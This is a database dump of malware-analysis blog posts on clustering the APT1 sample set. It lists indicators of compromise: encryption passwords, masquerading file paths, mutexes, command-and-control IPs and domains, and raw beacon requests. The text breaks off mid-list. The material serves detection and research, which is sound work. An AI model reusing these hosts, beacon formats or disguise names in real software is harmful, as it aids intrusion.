[esi+10h]\r\nsub\r\necx\r\neax\r\nsub\r\nsub\r\nsub\r\nsub\r\nsub\r\nsub\r\nsub\r\nsub\r\n\r\n12f25ce81596aeb19e75cc7ef08f3a38.asm\r\n268eef019bf65b2987e945afaf29643f.asm\r\n468ff2c12cffc7e5b2fe0ee6bb3b239e.asm\r\n4c6bddcca2695d6202df38708e14fc7e.asm\r\n5a728cb9ce56763dccb32b5298d0f050.asm\r\n727a6800991eead454e53e8af164a99c.asm\r\n8e8622c393d7e832d39e620ead5d3b49.asm\r\nbd8b082b7711bc980252f988bb0ca936.asm\r\nc6a4bb1a4e4f69ec71855d70d6960859.asm\r\ndb05df0498b59b42a8e493cf3c10c578.asm\r\ne1b6940985a23e5639450f8391820655.asm\r\nef8e0fb20e7228c7492ccdc59d87c690.asm\nLoadLibraryA\r\nGetProcAddress\r\nsub\r\nsub\r\nstrstr\r\nstrchr\r\nGetSystemDirectoryA\r\ntime\r\nsrand\r\nmalloc\r\nsub\r\nsub\r\nstrncmp\r\nSleep\r\nsub\r\nSleep\r\nsub\r\nSleep\r\nCreatePipe\r\nCreatePipe\r\nGetStartupInfoA\r\nCreateProcessA\r\nGetLastError\r\n_snprintf\r\nsub\r\nCreateProcessA\r\nCreateThread\r\nCreateThread\r\nWaitForMultipleObjects\r\nGetExitCodeThread\r\nTerminateThread\r\nGetExitCodeThread\r\nTerminateThread\r\nGetExitCodeProcess\r\nTerminateProcess\r\nsub\r\nsub\r\nGetLastError\r\n_snprintf\r\nsub\r\nCloseHandle\r\nCloseHandle\r\nCloseHandle\r\nCloseHandle\r\nsub\r\nsub\r\nSleep\r\nPeekNamedPipe\r\nReadFile\r\nsub\n0dd3677594632ce270bcf8af94819caf.asm\r\n270d42f292105951ee81e4085ea45054.asm\r\n523f56515221161579ee6090c962e5b1.asm\nNotably, the disassembled code – after some selective processing and normalization – can be treated in a same way as student source code submissions for their assessments at uni and… be checked for plagiarism. The most common technique used for this purpose relies on measuring the  cosine similarity. I am currently playing with it and will write more about my findings in another post.\nThanks for reading!\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/03/12/clustering-and-batch-analysis-of-apt1-sampleset-part-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (321, 'Permanent Link to Clustering and Batch Analysis of APT1 sampleset, part 2', 'Hexacorn', 'March 5, 2013 ', 'Part 1, Part 2, Part 3\nIn my last post, I presented results of the batch analysis and clustering attempts of the APT1 sampleset. Today, I will continue on the topic of clustering, this time looking at the problem from a different angle. Again, results are not mind blowing, but it’s an experiment and it’s not about the destination, but about the journey \nTypical programs, even if recompiled or rebuilt with different configuration often preserve their internal structure. It is partially a result of ‘if it works, don’t touch’ approach, programmer’s laziness, his/her coding habits, a side effect of the ‘business logic’ implemented in the program and many other factors. One can compare a patched file and immediately spot the changes; or, pick up a a characteristic sequence of code or data and search for similar sequences in the whole sampleset. The fact that it is possible to compare programs on a binary level is well known and pretty much every 0day hunter has at some stage used or is currently using this technique in their bughunting adventures (using tools like BinNavi).\nIn a context of sample clustering, I think we don’t necessarily need to go as far as in-depth binary code comparison – there are a lot of shortcuts we can take here. The easiest is to pick up these code sequences that refer to strings.  And to narrow down the scope for this post, we only look at string comparisons. They are used for parsing of command line arguments, RAT/bot commands, data sent over the protocols and so on and so forth.\nThere are a few ways compilers implement string comparisons on a machine code level – based on a quick research and already done clustering on the APT1 sampleset, I know that plenty of string comparisons are done using just 5 functions: _strnicmp, memcmp, strcmp, strncmp, strstr.\nIn order to look at the code sequences of this sort we need to find a better way of extracting strings from the samples, because a typical static analysis tool extracts strings from the file in a ‘dumb’ way and doesn’t provide the necessary programming/algorithmic context. Using a tool like PESectionExtractor doesn’t help either as the context it provides is related only to a physical location of the string, and doesn’t tell us how the string is being used by the program. What we need is a tool that can disassemble the code properly or even better – decompile it. And the obvious choice here is Ida Pro with its Hex-Rays plugin.\nThe resulting files are a bit too large for the direct copy and paste in this post, so I am providing direct links to text files below:\n\n _strnicmp_cluster.txt\nmemcmp_cluster.txt\nstrcmp_cluster.txt\nstrncmp_cluster.txt\nstrstr_cluster.txt\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/03/05/clustering-and-batch-analysis-of-apt1-sampleset-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (322, 'Permanent Link to Clustering and Batch Analysis of APT1 sampleset', 'Hexacorn', 'March 4, 2013 ', 'Part 1, Part 2, Part 3\nAs I mentioned in my previous post, I was toying around with various samplesets (e.g. zero access, APT1, etc.) and since the APT1 sampleset is all over the news, I took a stab at it and sandboxed the samples + attempted to cluster the results to see if I any patterns emerge…\nThe sampleset – batch analysis\nEncryption\nSome of the samples use DES and the following passwords:\n\nHello@)!0\n!b=z&7?cc,MQ\n1b=z7/lx+WK!\n!b=z&7?cc,MQ>\n\nFile names / locations:\n\n%USERPROFILE%\\Application Data\\Adobe8.0.0\\update.exe\n%USERPROFILE%\\Application Data\\Adobe\\Reader 9.0\\Esl\\reader_sl.exe\n%USERPROFILE%\\Application Data\\Adobe\\reader_sl.exe\n%USERPROFILE%\\Application Data\\Help\\svchost.exe\n%USERPROFILE%\\Local Settings\\Application Data\\Microsoft\\svchost.exe\n%USERPROFILE%\\Local Settings\\Application Data\\Microsoft\\wuauclt.exe\n%USERPROFILE%\\Local Settings\\spoolsvr.exe\n%USERPROFILE%\\Local Settings\\Temp\\AcroRD32.exe\n%USERPROFILE%\\Local Settings\\Temp\\AdobeARM.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\17DC75.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17DC85.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17DD6F.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17DD9E.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17DDEC.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17E7CF.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\17EE48.dmp\n%USERPROFILE%\\LOCALS~1\\Temp\\AdobeUpdate.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\AdobeUpdater.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\BP Makes Two Gas Discoveries in Egypt’s Nile Delta.doc\n%USERPROFILE%\\LOCALS~1\\Temp\\ctfmon.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\ctfmon.exe\\svchost.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\em.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\Halliburton to Present at Dahlman Rose & Co. Ultimate Oil Services And E&P Conference.pdf\n%USERPROFILE%\\LOCALS~1\\Temp\\iTunesHelper.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\Material Type Ore 20160605.pdf\n%USERPROFILE%\\LOCALS~1\\Temp\\Open letter of Dow Corning Corp.pdf\n%USERPROFILE%\\LOCALS~1\\Temp\\POWER_GEN_2012.pdf\n%USERPROFILE%\\LOCALS~1\\Temp\\runinfo.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\svchost.exe\n%USERPROFILE%\\LOCALS~1\\Temp\\Top Stock Alerts for Day Traders – Facebook, Freeport-McMoRan Copper & Gold, Fastenal, Research In Motion, EnCana, and Dollar General.doc\n%USERPROFILE%\\LOCALS~1\\Temp\\US hesitant in condemning North Korean launch.pdf\n%USERPROFILE%\\LOCALS~1\\Temp\\WINWORD.EXE\n%USERPROFILE%\\Start Menu\\Programs\\Startup\\adobe_sl.lnk\n%USERPROFILE%\\Start Menu\\Programs\\Startup\\AdobeRe.exe\n%USERPROFILE%\\Start Menu\\Programs\\Startup\\ctfmon.exe\n%USERPROFILE%\\Templates\\adobe_sl.exe\nc:\\WINDOWS\\ntshrui.dll\nC:\\WINDOWS\\ntshrui.dll1\nC:\\WINDOWS\\svchost.exe\nC:\\WINDOWS\\System32\\Nwsapagent.dll\nC:\\WINDOWS\\system\\ersvc.dll\nc:\\WINDOWS\\system\\ersvc.dll\n\nMutexes:\n\n!@ADS@#$\n1234\n1qaz@WSX\nCOPYRIGHTMM2011V2\nfire\nGeman.do\nGlobal\\AdobeReaderX\nGLOBAL\\ADR32\nGLOBAL\\ADR64\nGLOBAL\\MSFT64\nGlobxxxxxxxxssssseeeeeeal\\ADReeeerrttyyyy64\nhackersuck\nijnrfv\nletusgohtppmmv1.0\nletusgohtppmmv2.0.0.1\n\nServices:\n\n.Net CLR (Microsoft .Net Framework COM+ Support)\nDevFS (Device File System)\nDevFS (Device File System)\nDevSec (Rpc Device Management)\nInfMon (Infrared Monitor)\nNwsapagent (Gateway Service for Netware)\nRasAuto (Remote Access Auto Connection Manager)\ntcpguard (tcpguard)\n\nConnections (note, may contain clean IPs/URLs):\n\n10.166.1.182\n127.0.0.1\n140.116.70.8\n143.89.35.19\n202.105.39.39\n202.39.61.136\n202.6.235.83\n203.200.205.245\n204.111.73.150\n205.159.83.91\n208.239.156.123\n209.124.51.194\n209.124.51.219\n209.151.145.185\n209.161.249.125\n209.208.114.83\n209.233.16.84\n209.253.17.229\n211.232.57.235\n212.130.19.154\n216.15.210.68\n218.232.105.200\n218.232.66.12\n218.233.206.2\n218.234.17.30\n24.73.192.154\n60.248.52.95\n61.219.67.1\n64.80.153.108\n65.105.157.228\n65.110.1.32\n65.114.195.226\n65.89.173.68\n66.151.16.30\n66.155.114.145\n66.170.3.43\n66.228.132.53\n68.17.104.162\n68.96.31.136\n69.20.5.219\n69.25.50.10\n69.28.168.10\n69.74.43.87\n69.90.123.6\n69.90.18.22\n69.90.18.23\n69.90.65.240\n70.62.232.98\n74.86.197.56\n75.145.139.18\nadmin.datastorage01.org\nAdobeFlash.info.tm\ncas.ibooks.tk\ncas.m-e.org.ru\ncode.mcafeepaying.com\nColville.com\nconference.ddns.us\nctcs.bigdepression.net\nctx.comrepair.net\ndev.teamattire.com\ndocuments.downloadsite.me\neclipsecti.infobusinessus.org\nexactearth.info.tm\nfasa.arrowservice.net\nfasa.bigish.net\nfasa.newsonet.net\nflash.aoldaily.com\nflash.aunewsonline.com\nflash.cnndaily.com\nflash.mcafeepaying.com\nflash.usnewssite.com\nfni.bigish.net\nhelp.purpledaily.com\nhint.happyforever.com\nhojutsu.com\njapan.yahoodaily.com\njimnaugle.com\njohnford985.appspot.com\nks.aoldaily.com\nks.cnndaily.com\nks.jaimeastorga.mx\nks.manguvaljak.ee\nks.petrotdl.com.ar\nks.utworld.ch\nmedia.finanstalk.ru\nmeeting.toh.info\nmoto.purpledaily.com\nmoto1.newsonet.net\nmoto2.earthsolution.org\nnews.canadatvsite.com\nnews.micyuisyahooapis.com\nnews.msnhome.org\nolmusic100.com\nportal.itsaol.com\npublic.ddns.us\nqhun-mons.businessformars.com\nreport.crabdance.com\nsafety.canadatvsite.com\nshare.canoedaily.com\nsoftware.myftp.info\nsports.canoedaily.com\nstratos.aoldaily.com\nstratos.mcafeepaying.com\ntcw.homier.com\nthecrownsgolf.org\ntime.mediaxsds.net\nttl.tfxdccssl.net\nun.linuxd.org\nupdate.dnepr.com\nupdate.sektori.org\nupdate.slowblog.com\nus.gnpes.org\nvop.earthsolution.org\nwikileaks.ddns.us\nwww.bigish.net\nwww.bluecoate.com\nwww.businessformars.com\nwww.competrip.com\nwww.cvba.com\nwww.deebeedesigns.ca\nwww.doversolutions.co.in\nwww.drgeorges.com\nwww.dsds.co.kr\nwww.fbrshop.com\nwww.freelanceindy.com\nwww.gobroadreach.com\nwww.heliospartners.com\nwww.jiangmin.com.tw\nwww.kayauto.net\nwww.keenathomas.com\nwww.microsoft.com\nwww.mountainvalley.americanunfinished.com\nwww.mwa.net\nwww.newsesport.com\nwww.olmusic100.com\nwww.omegalogos.org\nwww.pastorsrest.com\nwww.pcs157.com\nwww.rbaparts.com\nwww.smilecare.com\nwww.spmiller.org\nwww.uszzcs.com\nwww.vwrm.com\nwww.woodagency.com\nzh.lksoftvc.net\n\nURLs and URL-like patterns (from static analysis; may contain errors)\n\n2.earthsolution.org\nAdobeFlash.info.tm\nwww.mevatec.com\nColville.com\namericanunfinished.com\naoldaily.com\nappspot.com\naunewsonline.com\nbigdepression.net\nbluecoate.com\nbusinessformars.com\ncanadatvsite.com\ncanoedaily.com\ncnndaily.com\ncolville.com\ncom.tw\ncompetrip.com\ncrabdance.com\ncvba.com\ndatastorage01.org\nddns.us\ndeebeedesigns.ca\ndnepr.com\ndoversolutions.co.in\ndrgeorges.com\ndsds.co.kr\nearthsolution.org\nfbrshop.com\nfinanstalk.ru\nfreelanceindy.com\ngnpes.org\ngobroadreach.com\nhappyforever.com\nhojutsu.com\nhomier.com\nibooks.tk\ninfo.tm\nitsaol.com\njimnaugle.com\nkayauto.net\nkeenathomas.com\nlksoftvc.net\nmcafeepaying.com\nmediaxsds.net\nmicrosoft.com\nmicyuisyahooapis.com\nmsnhome.org\nmwa.net\nnewsesport.com\nnewsonet.net\nomegalogos.org\norg.ru\npastorsrest.com\npcs157.com\npurpledaily.com\nrbaparts.com\nsektori.org\nslowblog.com\nsmilecare.com\nspmiller.org\nteamattire.com\ntfxdccssl.net\nthecrownsgolf.org\ntoh.info\nusnewssite.com\nuszzcs.com\nvwrm.com\nwoodagency.com\nyahoodaily.com\nHojutsu.com\nColville.com\nHojutsu.com\nadmin.datastorage01.org\ncas.ibooks.tk\nconference.ddns.us\nctcs.bigdepression.net\ndev.teamattire.com\nfasa.arrowservice.net\nfasa.newsonet.net\nfni.bigish.net\njapan.yahoodaily.com\njimnaugle.com\nmedia.finanstalk.ru\nmeeting.toh.info\nmoto.purpledaily.com\nmoto2.earthsolution.org\nnews.canadatvsite.com\nnews.micyuisyahooapis.com\nnews.msnhome.org\npublic.ddns.us\nsafety.canadatvsite.com\nshare.canoedaily.com\nthecrownsgolf.org\ntime.mediaxsds.net\nttl.tfxdccssl.net\nun.linuxd.org\nupdate.dnepr.com\nupdate.sektori.org\nupdate.slowblog.com\nus.gnpes.org\nwikileaks.ddns.us\nwww.BusinessForMars.com\nwww.bigish.net\nwww.bluecoate.com\nwww.competrip.com\nwww.cvba.com\nwww.deebeedesigns.ca\nwww.doversolutions.co.in\nwww.drgeorges.com\nwww.dsds.co.kr\nwww.fbrshop.com\nwww.freelanceindy.com\nwww.gobroadreach.com\nwww.kayauto.net\nwww.keenathomas.com\nwww.microsoft.com\nwww.mountainvalley.americanunfinished.com\nwww.mwa.net\nwww.omegalogos.org\nwww.pastorsrest.com\nwww.rbaparts.com\nwww.smilecare.com\nwww.spmiller.org\nwww.vwrm.com\nwww.woodagency.com\nzh.lksoftvc.net\nK4Pu.ht\nOlmusic100.com\nSdv.gf\nSh.sd\namericanunfinished.com\naoldaily.com\nappspot.com\naunewsonline.com\nbigdepression.net\nbluecoate.com\nbusinessformars.com\ncanadatvsite.com\ncanoedaily.com\ncnndaily.com\ncolville.com\ncom.tw\ncompetrip.com\ncrabdance.com\ncvba.com\ndatastorage01.org\nddns.us\ndeebeedesigns.ca\ndnepr.com\ndoversolutions.co.in\ndrgeorges.com\ndsds.co.kr\nearthsolution.org\nfbrshop.com\nfinanstalk.ru\nfreelanceindy.com\ngnpes.org\ngobroadreach.com\nhappyforever.com\nhojutsu.com\nhomier.com\nibooks.tk\ninfo.tm\nitsaol.com\njimnaugle.com\nkayauto.net\nkeenathomas.com\nlksoftvc.net\nmcafeepaying.com\nmediaxsds.net\nmicrosoft.com\nmicyuisyahooapis.com\nmsnhome.org\nmwa.net\nnewsesport.com\nnewsonet.net\nomegalogos.org\norg.ru\npastorsrest.com\npcs157.com\npurpledaily.com\nrbaparts.com\nsektori.org\nslowblog.com\nsmilecare.com\nspmiller.org\nteamattire.com\ntfxdccssl.net\nthecrownsgolf.org\ntoh.info\nusnewssite.com\nuszzcs.com\nvwrm.com\nwoodagency.com\nyahoodaily.com\nX:\\command.com\nadmin.datastorage01.org\nadobeflash.info.tm\nasa.bigish.net\naspjk07@hotmail.com\natt.infosupports.com\naugle.com\nbigdepression.net\nbluecoate.com\nbusinessus.org\ncanadatvsite.com\ncas.ibooks.tk\ncas.m-e.org.ru\ncode.mcafeepaying.com\ncolville.com\ncommand.com\ncompetrip.com\nconference.ddns.us\ncontent.ie\ncrz.dnsweb.org\nctcs.bigdepression.net\nctcs.earthsolution.org\nctx.comrepair.net\ndeebeedesigns.ca\ndev.teamattire.com\ndns.progammerli.com\ndove.blackcake.net\ndrgeorges.com\ne.canoedaily.com\neclipsecti.infobusinessus.org\neds1.infosupports.com\nerence.ddns.us\nessformars.com\nexactearth.info.tm\nfasa.arrowservice.net\nfasa.bigish.net\nfasa.newsonet.net\nfbrshop.com\nfetch.py\nflash.aoldaily.com\nflash.aunewsonline.com\nflash.cnndaily.com\nflash.mcafeepaying.com\nflash.usnewssite.com\nfni.bigish.net\nfreelanceindy.com\ngateway.messenger.hotmail.com\ngobroadreach.com\ngro.sepng.su\nh.lk\nh:mm:ss.tt\nhelp.purpledaily.com\nhint.happyforever.com\nhojutsu.co\nhojutsu.com\nhotmail.com\nsafety.canadatvsite.com\nwww.microsoft.com\nadmin.datastorage01.org\nadobeflash.info.tm\ncas.ibooks.tk\ncas.m-e.org.ru\ncolville.com\nconference.ddns.us\ndev.teamattire.com\nhint.happyforever.com\nhojutsu.com\njapan.yahoodaily.com\njimnaugle.com\nmedia.finanstalk.ru\nmeeting.toh.info\nnews.canadatvsite.com\nnews.micyuisyahooapis.com\nnews.msnhome.org\nportal.itsaol.com\npublic.ddns.us\nreport.crabdance.com\nsafety.canadatvsite.com\nshare.canoedaily.com\nsports.canoedaily.com\ntcw.homier.com\nthecrownsgolf.org\ntime.mediaxsds.net\nttl.tfxdccssl.net\nupdate.dnepr.com\nupdate.sektori.org\nupdate.slowblog.com\nus.gnpes.org\nwikileaks.ddns.us\nwww.bluecoate.com\nwww.businessformars.com\nwww.competrip.com\nwww.cvba.com\nwww.deebeedesigns.ca\nwww.doversolutions.co.in\nwww.drgeorges.com\nwww.dsds.co.kr\nwww.fbrshop.com\nwww.freelanceindy.com\nwww.gobroadreach.com\nwww.jiangmin.com.tw\nwww.kayauto.net\nwww.keenathomas.com\nwww.microsoft.com\nwww.mountainvalley.americanunfinished.com\nwww.mwa.net\nwww.newsesport.com\nwww.omegalogos.org\nwww.pastorsrest.com\nwww.pcs157.com\nwww.rbaparts.com\nwww.smilecare.com\nwww.spmiller.org\nwww.uszzcs.com\nwww.vwrm.com\nwww.woodagency.com\nzh.lksoftvc.net\njohnford985.appspot.com/fetch.py\ncode.mcafeepaying.com\nctcs.bigdepression.net\nflash.aoldaily.com\nflash.aunewsonline.com\nflash.cnndaily.com\nflash.mcafeepaying.com\nflash.usnewssite.com\njohnford985.appspot.com\nks.cnndaily.com\nmoto.purpledaily.com\nmoto1.newsonet.net\nmoto2.earthsolution.org\nstratos.aoldaily.com\nstratos.mcafeepaying.com\nic.ddns.us\nice.net\nille.com\nily.com\ning.toh.info\njapan.yahoodaily.com\njimnaugle.com\njohnford985.appspot.com\nk.ca\nkayauto.net\nkeenathomas.com\nks.aoldaily.com\nks.cnndaily.com\nks.jaimeastorga.mx\nks.manguvaljak.ee\nks.petrotdl.com.ar\nks.utworld.ch\nm.ms\nmedia.finanstalk.ru\nmeeting.toh.info\nmessenger.hotmail.com\nmicrosoft.com\nmicyuisyahooapis.com\nmoc.yliadnnc.sk\nmoto.purpledaily.com\nmoto1.newsonet.net\nmoto2.earthsolution.org\nmountainvalley.americanunfinished.com\nmsn.com\nmsnhome.org\nmwa.net\nn.datastorage01.org\nn.linuxd.org\nn.yahoodaily.com\nnews.canadatvsite.com\nnews.micyuisyahooapis.com\nnews.msnhome.org\nnexus.passport.com\nni.bigish.net\nnic.safalife.com\nntdetect.com\nolmusic100.com\nomegalogos.org\nowservice.ne\npastorsrest.com\nportal.itsaol.com\npublic.ddns.us\npurpledaily.com\nqhun-mons.businessformars.com\nqusc12.infosupports.com\nrbaparts.com\nreport.crabdance.com\nrownsgolf.org\ns.org\nsafety.canadatvsite.com\nshare.canoedaily.com\nsmilecare.com\nsonet.net\nsports.canoedaily.com\nsra.blackcake.net\nsra.infosupports.com\nssus.org\nstratos.aoldaily.com\nstratos.mcafeepaying.com\ntcw.homier.com\nte.dnepr.com\nteamattire.com\nthecrownsgolf.org\ntime.mediaxsds.net\ntsu.com\nttl.tfxdccssl.net\nty.canadatvsite.com\nun.linuxd.org\nupdate.dnepr.com\nupdate.mcafeepaying.com\nupdate.sektori.org\nupdate.slowblog.com\nus.gnpes.org\nusc12.blackcake.net\nvop.earthsolution.org\nvwrm.com\nw.com\nus.gn\nwikileaks.ddns.us\nwoodagency.com\nww.bigish.net\nwww.BusinessForMars.com\nwww.bigish.net\nwww.bluecoate.com\nwww.businessformars.com\nwww.competrip.com\nwww.cvba.com\nwww.deebeedesigns.ca\nwww.doversolutions.co.in\nwww.drgeorges.com\nwww.dsds.co.kr\nwww.fbrshop.com\nwww.freelanceindy.com\nwww.gobroadreach.com\nwww.heliospartners.com\nwww.holdent.com.au\nwww.inkscape.org\nwww.jiangmin.com.tw\nwww.kayauto.net\nwww.keenathomas.com\nwww.microsoft.com\nwww.mountainvalley.americanunfinished.com\nwww.mwa.ne\nwww.mwa.net\nwww.newsesport.com\nwww.olmusic100.com\nwww.omegalogos.org\nwww.pastorsrest.com\nwww.pcs157.com\nwww.rbaparts.com\nwww.smilecare.com\nwww.spmiller.org\nwww.uszzcs.com\nwww.vwrm.com\nwww.woodagency.com\nzh.lksoftvc.net\n\nHTTP Requests:\n\nCONNECT  HTTP/1.0\nCONNECT /index.asp HTTP/1.1\nGET  HTTP/1.1\nGET /1.asp?rands=FXMJVXGOJJ&acc=&str=select id from tab_online where regcode = ‘FXMJVXGOJJ’ HTTP/1.0\nGET /197.1.16.3_7.html HTTP/1.1\nGET /2011/n325423.shtml?pvid=fAAAACIkAOyJMGjxiYadwRyN9buY2MAeOtQPGgD7e0CsZAFTwA8txDliAAA= HTTP/1.0\nGET /2651.asp HTTP/1.1\nGET /3491.asp HTTP/1.1\nGET /4823.asp HTTP/1.1\nGET /4981.asp HTTP/1.1\nGET /5310.asp HTTP/1.1\nGET /5712.html HTTP/1.1\nGET /6212.html HTTP/1.1\nGET /6958.html HTTP/1.1\nGET /_borders/top.htm HTTP/1.1\nGET /A2/front/lm/mini/noborder/?AQB=1&ndh=1&t=480&lv=VDipXNKF&pageName=About&ss=ipWHkqSl&g=Council&cid=225&v1=c25&hp=N&tal=&AQE=1 HTTP/1.0\nGET /aboutus_ohs.html HTTP/1.1\nGET /adobe.html HTTP/1.1\nGET /api/get_attention_num/adfshow?slot=7cLLvm4e&p=F&may=128&g=4363&n=0&i=Home HTTP/1.0\nGET /aspnet_client/system_web/1_0_3705_0/SmartNav.jpg HTTP/1.1\nGET /attachments/C262-240.jpg HTTP/1.1\nGET /bbs/db/1.asp?rands=KKIJLONGAP&acc=&str=select id from tab_online where regcode = ‘KKIJLONGAP’ order by id asc HTTP/1.0\nGET /bbs/db/1.asp?rands=SEXGJLSSXM&acc=&str=select id from tab_online where regcode = ‘SEXGJLSSXM’ order by id asc HTTP/1.0\nGET /BerwickFire/rental.html HTTP/1.1\nGET /css/about.htm HTTP/1.1\nGET /css/style.html HTTP/1.1\nGET /Default.aspx?INDEX=CGPEHQURTR HTTP/1.1\nGET /Default.aspx?INDEX=EIGHIZHOMM HTTP/1.1\nGET /Default.aspx?INDEX=EYZALCJEKE HTTP/1.1\nGET /Default.aspx?INDEX=GIOJJREGBY HTTP/1.1\nGET /Default.aspx?INDEX=IHPSYRANKA HTTP/1.1\nGET /Default.aspx?INDEX=IPESEDUTED HTTP/1.1\nGET /Default.aspx?INDEX=JBVUQETDVA HTTP/1.1\nGET /Default.aspx?INDEX=MAJVUXJDAQ HTTP/1.1\nGET /Default.aspx?INDEX=QFBMPJCWAL HTTP/1.1\nGET /Default.aspx?INDEX=XMDOFYNHDY HTTP/1.1\nGET /default.htm HTTP/1.1\nGET /default.html HTTP/1.1\nGET /download.htm HTTP/1.1\nGET /download/confere.html HTTP/1.1\nGET /download/device_ad.asp?device_t=2928269924&key=dxrqdgct&device_id=ad&cv=dxrqdgctnynmgjjfn HTTP/1.0\nGET /downloadsoft.htm HTTP/1.1\nGET /fax.html HTTP/1.1\nGET /file/yahootemp.html HTTP/1.1\nGET /Gallery/Winterfest/2.jpg HTTP/1.1\nGET /html/proe_tcp.html HTTP/1.1\nGET /images/1.asp?rands=HOWBTFQLOZ&acc=&str=select id from tab_online where regcode = ‘HOWBTFQLOZ’ order by id asc HTTP/1.0\nGET /images/_vti_img/index.asp HTTP/1.1\nGET /images/bs.gif HTTP/1.1\nGET /images/btn_info.jpg HTTP/1.1\nGET /images/button.jpg HTTP/1.1\nGET /images/colt_defense.jpg HTTP/1.1\nGET /images/db/1.asp?rands=BWFIMNAJEE&acc=&str=select id from tab_online where regcode = ‘BWFIMNAJEE’ order by id asc HTTP/1.0\nGET /images/device_index.asp?device_t=5962704463&key=odnnmvgr&device_id=index&cv=odnnmvgrmftvujsyg HTTP/1.0\nGET /images/error.jpg HTTP/1.1\nGET /images/head_left.jpg HTTP/1.1\nGET /images/icons/3224?meth=gc&tid=2005614&cqe=3884550&inif=tLu3v8eD3Lu+vqjHy8PI1MvMwtTCytTLycnct7uosceUkZzXgNy1qarHz9TL3LK+qbTHy8+fnw==&syun=250 HTTP/1.1\nGET /images/index_0_02.jpg HTTP/1.1\nGET /images/leftnav_prog_bg.jpg HTTP/1.1\nGET /images/li.gif HTTP/1.1\nGET /images/logo.png HTTP/1.1\nGET /images/reach1.jpg HTTP/1.1\nGET /images/record.asp?device_t=3134688572&key=ywbyftdd&device_id=index&cv=ywbyftddoirafvbak&result=no%20command%0D%0A%0D%0ANext%3ASun%20Feb%2024%2009%3A50%3A15%202013%0Adelay%3A3600%20sec%0D%0A HTTP/1.0\nGET /images/title.png HTTP/1.1\nGET /index.htm HTTP/1.1\nGET /index.html HTTP/1.1\nGET /index.html HTTP/1.1\nGET /index/default.htm HTTP/1.1\nGET /index01.htm HTTP/1.1\nGET /info/2013.html?1361695580 HTTP/1.0\nGET /info/2013.html?1361695600 HTTP/1.0\nGET /info/sh1/search.asp HTTP/1.1\nGET /info/sh3/search.asp HTTP/1.1\nGET /java/careers.html HTTP/1.1\nGET /loa/database3/sun.html?a=1317&b=10043&typ=ntWVDtQM&user=home_page|homepage_2nd_banner_820x90&pagei=/8LfwOjw&border=0&local=yes&psi=170&f=1&form=&h=&i=100 HTTP/1.0\nGET /logo.html HTTP/1.1\nGET /logs/login.asp HTTP/1.1\nGET /M&A_alliances.htm HTTP/1.1\nGET /main/1.asp?rands=TGPJQNYBQY&acc=&str=select id from tab_online where regcode = ‘TGPJQNYBQY’ order by id asc HTTP/1.0\nGET /marq.htm HTTP/1.1\nGET /NET/kappa.jpg HTTP/1.1\nGET /order.htm HTTP/1.1\nGET /Ouo4f045.asp HTTP/1.1\nGET /pop.htm HTTP/1.1\nGET /postinfo.html?1361694906 HTTP/1.0\nGET /postinfo.html HTTP/1.1\nGET /pp/core/cgi/wor.asp?category=qiu&ace=i9t2&newText=&amer=160&eur=&mm=love HTTP/1.0\nGET /public.html HTTP/1.1\nGET /report/news.html HTTP/1.1\nGET /Resource/device_Tr.asp?device_t=1626586307&key=wuagysqk&device_id=Tr&cv=wuagysqkptijnsayv HTTP/1.0\nGET /Resource/record.asp?device_t=2620185844&key=majccsyr&device_id=Tr&cv=majccsyrufwyqrdkg&result=no%20command%0D%0A%0D%0ANext%3ASun%20Feb%2024%2009%3A57%3A53%202013%0Adelay%3A3600%20sec%0D%0A HTTP/1.0\nGET /Rossini.jpg HTTP/1.1\nGET /s/asp?XAAAANoRA_U9K_o8YmGncEcjfW7mNjAHjrUDxoA8sgB_SAA=p=1 HTTP/1.0\nGET /safe/1.asp?rands=LYWWLWYPSW&acc=&str=select id from tab_online where regcode = ‘LYWWLWYPSW’ order by id asc HTTP/1.0\nGET /saler.gif HTTP/1.1\nGET /staff.htm HTTP/1.1\nGET /study.htm HTTP/1.1\nGET /sun/moto.htm HTTP/1.1\nGET /top.htm HTTP/1.1\nGET /uc/myshow/blog/misc/gif/show.asp?a=mmRCP0L&p=2Fregion2F&u=n5vh8rmrnlopo1ec&b=vY6HjJ2C&n=0&c=233&x=400&y=4153&e=&wt=30q00dn00ei76hc9 HTTP/1.0\nGET /update.jpg HTTP/1.1\nGET /update.jpg HTTP/1.1\nGET /update.png HTTP/1.1\nGET /uwire/index.html HTTP/1.1\nGET /windows.html HTTP/1.1\nGET /word/display.asp HTTP/1.1\nGET /worlda.html HTTP/1.1\nGET /worldb.html HTTP/1.1\nGET /Y/ HTTP/1.1\nGET Default.asp HTTP/1.1\nGET Default.asp?uid=86893&do=friend&view=41&_lgmode=pri&from=bkT7i2 HTTP/1.1\nGET Default.asp?uid=86893&do=friend&view=toms HTTP/1.1\nGET index.html HTTP/1.1\nGET  HTTP/1.1\nPOST /fetch.py HTTP/1.1\nPOST 404error.asp HTTP/1.1\nPOST aspnet_client/report.asp HTTP/1.1\nPOST aspnet_client/system_web/1_0_3705_0/addCats.asp HTTP/1.1\nPOST index.asp HTTP/1.1\n\nUser Agents:\n\n08:52:09+[HOSTNAME]\n08:52:27+[HOSTNAME]\n10:03:44+[HOSTNAME]\n10:04:02+[HOSTNAME]\n5.1 04:15 [HOSTNAME]\\[USERNAME]\n5.1 04:19 [HOSTNAME]\\[USERNAME]\n5.1 04:45 [HOSTNAME]\\[USERNAME]\n5.1 04:46 [HOSTNAME]\\[USERNAME]\n5.1 04:47 